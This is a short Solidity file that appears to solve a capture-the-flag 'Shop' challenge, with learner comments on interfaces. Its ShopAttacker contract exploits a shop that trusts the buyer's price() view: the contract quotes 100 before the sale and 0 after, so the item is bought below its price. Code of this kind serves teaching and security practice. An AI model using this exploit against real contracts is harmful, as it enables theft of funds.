// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    //we need access to the isSold variable => we can't declare variables in an interface =>
    //therefore, we define a getter function thhat is labeled as view
    //instead of an interface, we could have also used an abstract contract => here we can define state variables
    function isSold() external view returns(bool);
    function buy() external;
}

contract ShopAttacker {
    IShop public challenge;

    constructor(address challengeAddress) {
        challenge = IShop(challengeAddress);
    }

    function attack() public {
        challenge.buy();
    } 

    function price() external view returns (uint256) {
        return challenge.isSold() ? 0 : 100;
    }   
}